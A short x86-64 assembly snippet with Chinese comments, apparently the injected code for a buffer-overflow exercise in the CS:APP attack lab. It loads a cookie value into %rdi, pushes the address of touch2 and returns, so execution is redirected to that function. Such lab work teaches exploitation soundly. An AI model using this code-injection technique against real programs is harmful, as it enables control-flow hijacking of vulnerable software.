movq $0x59b997fa,%rdi   #将cookie的值放到%rdi寄存器中
pushq $0x4017ec         #将touch2的函数地址压栈
ret                     # 跳转到touch2函数